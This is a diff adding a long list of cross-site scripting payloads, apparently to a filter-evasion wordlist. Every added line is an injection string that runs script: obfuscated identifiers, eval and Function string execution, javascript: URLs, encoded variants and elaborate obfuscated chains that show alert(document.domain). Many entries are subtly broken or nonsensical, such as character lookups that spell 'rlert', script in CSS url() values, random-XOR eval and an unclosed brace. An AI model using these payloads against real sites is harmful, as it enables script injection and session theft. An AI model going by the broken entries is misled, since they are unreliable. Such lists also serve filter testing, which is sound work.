@@ -71,5 +71,230 @@
 𒀀='',𒀁=!𒀀+'',𒀂=!!𒀀+'',𒀃={}+'',𒀄=𒀂[0],𒀅=𒀂[1],𒀆=𒀂[2],𒀇=𒀂[3],𒀈=𒀂[4],𒀉=𒀁[0],𒀊=𒀁[1],𒀋=𒀁[2],document.onkeypress=function(){alert(1)}
 𒀀='',𒀁=!𒀀+'',𒀂=!!𒀀+'',𒀃={}+'',𒀄=𒀂[0],𒀅=𒀂[1],𒀆=𒀂[2],𒀇=𒀂[3],𒀈=𒀂[4],𒀉=𒀁[0],𒀊=𒀁[1],𒀋=𒀁[2],document.addEventListener('click',function(){alert(1)})
 𒀀='',𒀁=!𒀀+'',𒀂=!!𒀀+'',𒀃={}+'',𒀄=𒀂[0],𒀅=𒀂[1],𒀆=𒀂[2],𒀇=𒀂[3],𒀈=𒀂[4],𒀉=𒀁[0],𒀊=𒀁[1],𒀋=𒀁[2],document.attachEvent('onclick',function(){alert(1)})
+𒀀='',𒀁=!!𒀀+'',window[𒀁[1]+'lert'](1)
+𒀀='',𒀁=!!𒀀+'',top[𒀁[1]+'lert'](1)
+𒀀='',𒀁=!!𒀀+'',self[𒀁[1]+'lert'](1)
+𒀀='',𒀁=!!𒀀+'',parent[𒀁[1]+'lert'](1)
+𒀀='',𒀁=!!𒀀+'',window[𒀁[1]+'lert'](document.domain)
+𒀀='',𒀁=!𒀀+'',window[𒀁[1]+'lert'](1)
+𒀀='',𒀁=!𒀀+'',top[𒀁[1]+'lert'](1)
+𒀀='',𒀁=!𒀀+'',self[𒀁[1]+'lert'](1)
+𒀀='',𒀁=!𒀀+'',parent[𒀁[1]+'lert'](1)
+𒀀='',𒀁=!𒀀+'',window[𒀁[1]+'lert'](document.domain)
+𒀀='',𒀁=!𒀀+'',setTimeout(𒀁[1]+'lert(1)',1)
+𒀀='',𒀁=!!𒀀+'',setTimeout(𒀁[1]+'lert(1)',1)
+𒀀='',𒀁=!𒀀+'',setInterval(𒀁[1]+'lert(1)',1)
+𒀀='',𒀁=!!𒀀+'',setInterval(𒀁[1]+'lert(1)',1)
+𒀀='',𒀁=!𒀀+'',eval(𒀁[1]+'lert(1)')
+𒀀='',𒀁=!!𒀀+'',eval(𒀁[1]+'lert(1)')
+𒀀='',𒀁=!𒀀+'',Function(𒀁[1]+'lert(1)')()
+𒀀='',𒀁=!!𒀀+'',Function(𒀁[1]+'lert(1)')()
+𒀀='',onerror=alert,throw 1
+𒀀='',onerror=prompt,throw 1
+𒀀='',onerror=confirm,throw 1
+𒀀='',location='javascript:alert(1)'
+𒀀='',location='javascript:prompt(1)'
+𒀀='',location='javascript:confirm(1)'
+𒀀='',location.href='javascript:alert(1)'
+𒀀='',location.replace('javascript:alert(1)')
+𒀀='',location.assign('javascript:alert(1)')
+𒀀='',setTimeout('alert(1)',1)
+𒀀='',setInterval('alert(1)',1)
+𒀀='',eval('alert(1)')
+𒀀='',Function('alert(1)')()
+𒀀='',window.open('javascript:alert(1)')
+𒀀='',document.write('<script>alert(1)</script>')
+𒀀='',document.body.innerHTML='<img src=x onerror=alert(1)>'
+𒁀='',𒁁=!!𒁀+'',window[𒁁[1]+'lert'](1)
+𒁀='',𒁁=!!𒁀+'',top[𒁁[1]+'lert'](1)
+𒁀='',𒁁=!!𒁀+'',self[𒁁[1]+'lert'](1)
+𒁀='',𒁁=!!𒁀+'',parent[𒁁[1]+'lert'](1)
+𒁀='',𒁁=!𒁀+'',window[𒁁[1]+'lert'](1)
+𒁀='',𒁁=!𒁀+'',top[𒁁[1]+'lert'](1)
+𒁀='',𒁁=!𒁀+'',self[𒁁[1]+'lert'](1)
+𒁀='',𒁁=!𒁀+'',parent[𒁁[1]+'lert'](1)
+𒁀='',onerror=alert,throw 1
+𒁀='',location='javascript:alert(1)'
+𒁀='',setTimeout('alert(1)',1)
+𒁀='',eval('alert(1)')
+𒂀='',𒂁=!!𒂀+'',window[𒂁[1]+'lert'](1)
+𒂀='',𒂁=!!𒂀+'',top[𒂁[1]+'lert'](1)
+𒂀='',𒂁=!!𒂀+'',self[𒂁[1]+'lert'](1)
+𒂀='',𒂁=!!𒂀+'',parent[𒂁[1]+'lert'](1)
+𒂀='',𒂁=!𒂀+'',window[𒂁[1]+'lert'](1)
+𒂀='',𒂁=!𒂀+'',top[𒂁[1]+'lert'](1)
+𒂀='',𒂁=!𒂀+'',self[𒂁[1]+'lert'](1)
+𒂀='',𒂁=!𒂀+'',parent[𒂁[1]+'lert'](1)
+𒂀='',onerror=alert,throw 1
+𒂀='',location='javascript:alert(1)'
+𒃀='',𒃁=!!𒃀+'',window[𒃁[1]+'lert'](1)
+𒃀='',𒃁=!!𒃀+'',top[𒃁[1]+'lert'](1)
+𒃀='',𒃁=!!𒃀+'',self[𒃁[1]+'lert'](1)
+𒃀='',𒃁=!!𒃀+'',parent[𒃁[1]+'lert'](1)
+𒃀='',𒃁=!𒃀+'',window[𒃁[1]+'lert'](1)
+𒃀='',𒃁=!𒃀+'',top[𒃁[1]+'lert'](1)
+𒃀='',𒃁=!𒃀+'',self[𒃁[1]+'lert'](1)
+𒃀='',𒃁=!𒃀+'',parent[𒃁[1]+'lert'](1)
+𒃀='',onerror=alert,throw 1
+𒄀='',𒄁=!!𒄀+'',window[𒄁[1]+'lert'](1)
+𒄀='',𒄁=!!𒄀+'',top[𒄁[1]+'lert'](1)
+𒄀='',𒄁=!!𒄀+'',self[𒄁[1]+'lert'](1)
+𒄀='',𒄁=!!𒄀+'',parent[𒄁[1]+'lert'](1)
+𒄀='',𒄁=!𒄀+'',window[𒄁[1]+'lert'](1)
+𒄀='',𒄁=!𒄀+'',top[𒄁[1]+'lert'](1)
+𒄀='',𒄁=!𒄀+'',self[𒄁[1]+'lert'](1)
+𒄀='',𒄁=!𒄀+'',parent[𒄁[1]+'lert'](1)
+𒅀='',𒅁=!!𒅀+'',window[𒅁[1]+'lert'](1)
+𒅀='',𒅁=!!𒅀+'',top[𒅁[1]+'lert'](1)
+𒅀='',𒅁=!!𒅀+'',self[𒅁[1]+'lert'](1)
+𒅀='',𒅁=!!𒅀+'',parent[𒅁[1]+'lert'](1)
+𒅀='',𒅁=!𒅀+'',window[𒅁[1]+'lert'](1)
+𒅀='',𒅁=!𒅀+'',top[𒅁[1]+'lert'](1)
+𒅀='',𒅁=!𒅀+'',self[𒅁[1]+'lert'](1)
+𒅀='',𒅁=!𒅀+'',parent[𒅁[1]+'lert'](1)
+CSS.paintWorklet.addModule('data:text/javascript,registerPaint("xss",class{paint(){alert(1)}});setTimeout(()=>document.body.style.background="paint(xss)",1)')
+new AudioContext().audioWorklet.addModule('data:text/javascript,class extends AudioWorkletProcessor{process(){alert(1);return false}constructor(){super();this.port.postMessage("pwned")}}registerProcessor("xss",XSSProcessor)')
+CSS.registerProperty({name:'--xss',syntax:'<string>',inherits:true,initialValue:'alert(1)'});document.body.attributeStyleMap.set('--xss',new CSSUnparsedValue(['eval(getComputedStyle(document.body).getPropertyValue("--xss"))']))
+new OffscreenCanvas(1,1).getContext('2d').canvas.convertToBlob().then(b=>URL.createObjectURL(b)).then(u=>fetch(u).then(r=>r.text()).then(t=>eval('alert(1)')))
+new ResizeObserver(e=>new IntersectionObserver(e=>alert(1)).observe(document.body)).observe(document.body)
+document.head.innerHTML+='<style>@keyframes xss{to{opacity:0}}body{animation:xss 1ms}</style>';document.body.addEventListener('animationend',()=>alert(1))
+new PerformanceObserver(list=>alert(list.getEntries().length)).observe({entryTypes:['measure']});performance.mark('a');performance.mark('b');performance.measure('xss','a','b')
+document.body.attachShadow({mode:'open'}).innerHTML='<slot></slot>';new MutationObserver(()=>alert(1)).observe(document.body.shadowRoot,{childList:true});document.body.shadowRoot.innerHTML+='<div></div>'
+new BroadcastChannel('xss').postMessage('alert(1)');new BroadcastChannel('xss').onmessage=e=>eval(e.data)
+try{s=new SharedArrayBuffer(4);a=new Int32Array(s);Atomics.store(a,0,1);Atomics.notify(a,0);alert(Atomics.load(a,0))}catch(e){alert(1)}
+document.head.innerHTML+='<style>:root{--x:url("javascript:alert(1)")}</style>';document.body.style.background='var(--x)'
+WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0])).then(()=>alert(1)).catch(()=>alert(1))
+try{navigation.addEventListener('navigate',()=>alert(1));navigation.navigate('/')}catch(e){alert(1)}
+document.head.innerHTML+='<style>body{contain:layout style paint;content:counter(xss)}body::before{counter-increment:xss;content:"";background:url("javascript:alert(1)")}</style>'
+try{scheduler.postTask(()=>alert(1))}catch(e){setTimeout(()=>alert(1),0)}
+try{showDirectoryPicker().then(()=>alert(1)).catch(()=>alert(1))}catch(e){alert(1)}
+document.head.innerHTML+='<style>@layer xss{body{background:url("javascript:alert(1)")}}</style>'
+try{document.startViewTransition(()=>alert(1))}catch(e){alert(1)}
+new CompressionStream('gzip').writable.getWriter().write(new TextEncoder().encode('alert(1)')).then(()=>alert(1)).catch(()=>alert(1))
+document.head.innerHTML+='<style>@container(min-width:0){body{background:url("javascript:alert(1)")}}</style>'
+try{Temporal.Now.instant().toString();alert(1)}catch(e){alert(1)}
+document.head.innerHTML+='<style>@scroll-timeline xss{source:selector(body)}body{animation:xss linear;animation-timeline:xss}</style>';document.body.addEventListener('animationstart',()=>alert(1))
+try{serviceWorker.ready.then(reg=>reg.backgroundFetch.fetch('xss','/')).then(()=>alert(1))}catch(e){alert(1)}
+try{new EyeDropper().open().then(()=>alert(1)).catch(()=>alert(1))}catch(e){alert(1)}
+document.head.innerHTML+='<style>body{anchor-name:--xss;background:url("javascript:alert(1)")}</style>'
+document.body.innerHTML='<div><template shadowrootmode="open"><style>:host{background:url("javascript:alert(1)")}</style></template></div>'
+document.head.innerHTML+='<style>body{&::before{background:url("javascript:alert(1)")}}</style>'
+document.body.innerHTML+='<div popover id="x">XSS</div>';document.getElementById('x').addEventListener('beforetoggle',()=>alert(1));document.getElementById('x').showPopover()
+document.head.innerHTML+='<style>body{offset-path:path("M0,0");background:url("javascript:alert(1)")}</style>'
+document.head.innerHTML+='<script type="importmap">{"imports":{"xss":"data:text/javascript,alert(1)"}}</script><script type="module">import"xss"</script>'
+document.head.innerHTML+='<style>body{width:calc(1px);background:url("javascript:alert(1)")}</style>'
+document.head.innerHTML+='<link rel="preload" href="javascript:alert(1)" as="script" fetchpriority="high">'
+try{CSS.px(100).value;alert(1)}catch(e){alert(1)}
+new PerformanceObserver(list=>alert(1)).observe({entryTypes:['element']});document.body.setAttribute('elementtiming','xss')
+document.head.innerHTML+='<style>body{color:color(display-p3 1 0 0);background:url("javascript:alert(1)")}</style>'
+try{trustedTypes.createPolicy('xss',{createHTML:s=>s}).createHTML('<img src=x onerror=alert(1)>')}catch(e){alert(1)}
+document.head.innerHTML+='<style>:root{--xss:counter(c,decimal)}body{background:url("javascript:alert(1)")}</style>'
+try{new PressureObserver(()=>alert(1)).observe('cpu')}catch(e){alert(1)}
+document.head.innerHTML+='<style>::view-transition{background:url("javascript:alert(1)")}</style>';try{document.startViewTransition()}catch(e){}
+try{new Sanitizer().sanitizeFor('div','<img src=x onerror=alert(1)>')}catch(e){alert(1)}
+document.head.innerHTML+='<style>body{display:grid;grid-template-columns:subgrid;background:url("javascript:alert(1)")}</style>'
+try{navigator.storage.getDirectory().then(()=>alert(1))}catch(e){alert(1)}
+document.head.innerHTML+='<style>body{inset-inline-start:0;background:url("javascript:alert(1)")}</style>'
+try{navigator.wakeLock.request('screen').then(()=>alert(1))}catch(e){alert(1)}
+document.head.innerHTML+='<style>body{transform:rotate(sin(45deg));background:url("javascript:alert(1)")}</style>'
+try{navigator.clipboard.writeText('xss').then(()=>alert(1))}catch(e){alert(1)}
+document.head.innerHTML+='<style>@media(color-gamut:p3){body{background:url("javascript:alert(1)")}}</style>'
+try{getDigitalGoodsService('https://play.google.com/billing').then(()=>alert(1))}catch(e){alert(1)}
+document.head.innerHTML+='<style>body{padding:env(safe-area-inset-top);background:url("javascript:alert(1)")}</style>'
+try{serviceWorker.ready.then(reg=>reg.paymentManager.instruments.set('xss',{name:'XSS'})).then(()=>alert(1))}catch(e){alert(1)}
+
+\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029
+&#x61;&#108;&#101;&#114;&#116;&#40;&#x31;&#41;
+expression(alert(1))
+%2561%256C%2565%2572%2574%2528%2531%2529
+atob('YWxlcnQoMSk=')
+`${alert(1)}`
+\x61\x6C\x65\x72\x74\x28\x31\x29
+alert(1)%00
+ALeRt(1)
+a/**/l/**/e/**/r/**/t(1)
+alert‌(‍1‎)
+eval(String.fromCharCode(97+0,108+0,101+0,114+0,116+0,40+0,49+0,41+0))
+1?alert(1):0
+[alert][0](1)
+constructor.constructor('alert(1)')()
+Symbol.for('alert').toString().slice(7,-1)
+new Proxy({},{get:()=>alert(1)}).x
+Reflect.apply(alert,null,[1])
+function*g(){yield alert(1)}g().next()
+(async()=>alert(1))()
+new WeakMap([[{},alert(1)]]).get({})
+BigInt('0x'+alert(1))
+[,...[,,...[alert]]][2](1)
+String.raw`${alert(1)}`
+window?.alert?.(1)
+(null??alert)(1)
+class X{#a=alert(1)}
+await alert(1)
+import('data:text/javascript,alert(1)')
+import(`data:text/javascript,alert(1)`)
+x||=alert(1)
+alert(1_0)
+Error().constructor.constructor('alert(1)')()
+Promise.resolve().constructor.constructor('alert(1)')()
+//.constructor.constructor('alert(1)')()
+Date().constructor.constructor('alert(1)')()
+JSON.parse.constructor.constructor('alert(1)')()
+Math.abs.constructor.constructor('alert(1)')()
+Number.constructor.constructor('alert(1)')()
+Boolean.constructor.constructor('alert(1)')()
+Array.constructor.constructor('alert(1)')()
+Object.constructor.constructor('alert(1)')()
+String.constructor.constructor('alert(1)')()
+Function.constructor.constructor('alert(1)')()
+Symbol.constructor.constructor('alert(1)')()
+Map.constructor.constructor('alert(1)')()
+Set.constructor.constructor('alert(1)')()
+WeakSet.constructor.constructor('alert(1)')()
+ArrayBuffer.constructor.constructor('alert(1)')()
+DataView.constructor.constructor('alert(1)')()
+Int8Array.constructor.constructor('alert(1)')()
+parseInt('alert',36)(1)
+document['cre'+'ate'+'Ele'+'ment']('img')['src']='javascript:alert(1)'
+on/**/load=alert(1)
+src=java<!---->script:alert(1)
+\p{L}alert(1)
+alert(1).toLocaleString()
+Intl.DateTimeFormat().resolvedOptions(),alert(1)
+performance.now(),alert(1)
+crypto.getRandomValues(),alert(1)
+console.log(),alert(1)
+history.pushState(),alert(1)
+location.hash='#'+alert(1)
+new URL('javascript:alert(1)','http://x')
+URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'}))
+new Worker('data:text/javascript,alert(1)')
+new SharedWorker('data:text/javascript,alert(1)')
+new MessageChannel().port1.postMessage('alert(1)')
+dispatchEvent(new CustomEvent('x',{detail:alert(1)}))
+document.createDocumentFragment().appendChild(document.createElement('script')).innerHTML='alert(1)'
+
+try{const tdz=function(){Object.prototype.exec=function(cmd){return Function.prototype.constructor.call(this,cmd)()};const template=String.raw`alert(document.domain)`;return({}).__proto__.exec(template)};tdz()}catch(e){alert(1)
+try{const registry=new FinalizationRegistry(()=>alert(document.domain));const ref=new WeakRef({});registry.register(ref.deref(),ref);ref.deref();setTimeout(()=>gc?.(),1)}catch(e){alert(1)}
+try{const sab=new SharedArrayBuffer(8);const view=new Int32Array(sab);Atomics.store(view,0,0x616c657274);const decoded=String.fromCharCode(...new Uint8Array(sab,0,4));eval(decoded+'(1)')}catch(e){alert(1)}
+try{const portal=new Proxy(()=>{},{get:(t,p)=>p==='valueOf'?()=>alert(document.domain):portal});(portal+'')}catch(e){alert(1)}
+try{const paradox={[Symbol.toPrimitive]:()=>{Object.prototype.toString=()=>'alert(document.domain)';return''}};String(paradox);''.__proto__.__proto__.constructor.constructor(Object.prototype.toString)()}catch(e){alert(1)}
+try{const neural={async*[Symbol.asyncIterator](){yield alert(document.domain)}};(async()=>{for await(const pulse of neural)break})()}catch(e){alert(1)}
+try{class Quantum{#state=alert(document.domain);constructor(){return new Proxy(this,{get:(t,p)=>p in t?t[p]:this.#state})}}new Quantum()['collapse']}catch(e){alert(1)}
+try{const gate=new Proxy(import.meta,{get(){return(...args)=>alert(document.domain)}});gate.nonexistent()}catch(e){alert(1)}
+try{const cosmic=BigInt('0x'+'616c657274'.split('').map(c=>parseInt(c,16).toString(36)).join(''));eval(cosmic.toString(36).replace(/[0-9]/g,c=>String.fromCharCode(97+parseInt(c)))+'(1)')}catch(e){alert(1)}
+try{Error.stackTraceLimit=1;const dark=new Error();dark.stack='    at alert (document.domain)';eval(dark.stack.match(/at (\w+)/)[1]+'('+dark.stack.match(/\(([^)]+)\)/)[1]+')')}catch(e){alert(1)}
+try{const multiverse=function*(){};Object.prototype[Symbol.iterator]=function*(){yield eval;yield'alert(document.domain)'};const[exec,code]=[...multiverse];exec(code)}catch(e){alert(1)}
+try{const fabric=new AggregateError([],{cause:{valueOf(){Object.defineProperty(globalThis,'҂',{get(){return alert(document.domain)}});return''}}})+fabric.cause+''&&globalThis.҂}catch(e){alert(1)}
+try{const mind=new Intl.Segmenter('en',{granularity:'grapheme'});[...mind.segment('𝒶𝓁𝑒𝓇𝓉')].map(s=>String.fromCodePoint(...[...s.segment].map(c=>c.codePointAt()-0x1d4b6+97))).join('')+'(document.domain)';eval(_)}catch(e){alert(1)}
+try{let chrono='';new PerformanceObserver(list=>{list.getEntries().forEach(e=>{chrono+=String.fromCharCode(e.duration+96)});chrono.length>4&&eval(chrono+'(1)')}).observe({entryTypes:['measure']});'alert'.split('').forEach((c,i)=>performance.mark(`t${i}`,{detail:c.charCodeAt()-96}))&&performance.measure('x','t0','t1')&&performance.measure('x','t1','t2')&&performance.measure('x','t2','t3')&&performance.measure('x','t3','t4')}catch(e){alert(1)}
+try{const dna=new TextEncoder().encode('alert(1)');const splice=dna.reduce((acc,byte,i)=>{const codon=((byte^i)%26)+97;return acc+String.fromCharCode(codon)},'');eval(splice.replace(/./g,c=>String.fromCharCode(c.charCodeAt()^Math.floor(Math.random()*26))))}catch(e){eval(new TextDecoder().decode(new Uint8Array([97,108,101,114,116,40,49,41])))}
+try{const void_walker=new AbortController();void_walker.signal.addEventListener('abort',()=>eval(String.raw`alert(document.domain)`));const matrix=[65,66,67,68,69].map(x=>x-64);matrix.forEach((_,i)=>setTimeout(()=>i===4&&void_walker.abort(),i))}catch(e){alert(1)}
+try{crypto.subtle.generateKey({name:'AES-GCM',length:256},true,['encrypt']).then(key=>crypto.subtle.exportKey('raw',key)).then(buf=>new Uint8Array(buf)).then(arr=>{const entropy=arr.slice(0,5).map(b=>b%26+97);eval(String.fromCharCode(...entropy).replace(/[a-e]/,'alert')+'(1)')})}catch(e){alert(1)}
+try{const membrane=new CompressionStream('gzip');const writer=membrane.writable.getWriter();const reader=membrane.readable.getReader();writer.write(new TextEncoder().encode('alert(1)'));writer.close();reader.read().then(({value})=>eval(new TextDecoder().decode(value)))}catch(e){alert(1)}
+try{const psi=class extends HTMLElement{connectedCallback(){eval('alert(document.domain)')}};customElements.define('ψ-wave',psi);document.createElement('ψ-wave').connectedCallback()}catch(e){alert(1)}
+try{const tunnel=['javascript:','alert(1)'].map(s=>[...s].map(c=>String.fromCharCode(c.charCodeAt()^1)).join('')).map(s=>[...s].map(c=>String.fromCharCode(c.charCodeAt()^1)).join('')).join('');URL.canParse(tunnel)?eval(tunnel.slice(11)):alert(1)}catch(e){alert(1)}
+try{const horror=new ArrayBuffer(16);const view=new DataView(horror);[97,108,101,114,116,40,49,41].forEach((b,i)=>view.setUint8(i,b));const transferred=ArrayBuffer.prototype.transfer?horror.transfer():horror.slice();eval(new TextDecoder().decode(transferred))}catch(e){alert(1)}
+try{const Ω=new Proxy(new Uint8Array([0x61,0x6c,0x65,0x72,0x74]),{get:(t,p)=>p==='toString'?()=>String.fromCharCode(...t):t[p]});const ∇=new FinalizationRegistry(()=>globalThis[Ω+'']?.(document?.domain||1));const ∆=new WeakRef({[Symbol.toPrimitive]:()=>{Object.defineProperty(globalThis,Ω+'',{value:Function.prototype.constructor.bind(null,`(${Ω})(${JSON.stringify(document?.domain||1)})`),configurable:!0});return''}});∇.register(∆.deref?.(),∆);∆.deref?.()[Symbol.toPrimitive]?.();setTimeout(()=>globalThis[Ω+'']?.(),0)}catch{setTimeout(`${String.fromCharCode(97,108,101,114,116)}(${JSON.stringify(document?.domain||1)})`,0)}
 𒀀='',𒀁=!𒀀+'',𒀂=!!𒀀+'',𒀃={}+'',𒀄=𒀂[0],𒀅=𒀂[1],𒀆=𒀂[2],𒀇=𒀂[3],𒀈=𒀂[4],𒀉=𒀁[0],𒀊=𒀁[1],𒀋=𒀁[2],e=new Event('click');document.dispatchEvent(e);alert(1)
 𒀀='',𒀁=!𒀀+'',𒀂=!!𒀀+'',𒀃={}+'',𒀄=𒀂[0],𒀅=𒀂[1],𒀆=𒀂[2],𒀇=𒀂[3],𒀈=𒀂[4],𒀉=𒀁[0],𒀊=𒀁[1],𒀋=𒀁[2],e=document.createEvent('Event');e.initEvent('click',true,true);document.dispatchEvent(e);alert(1)
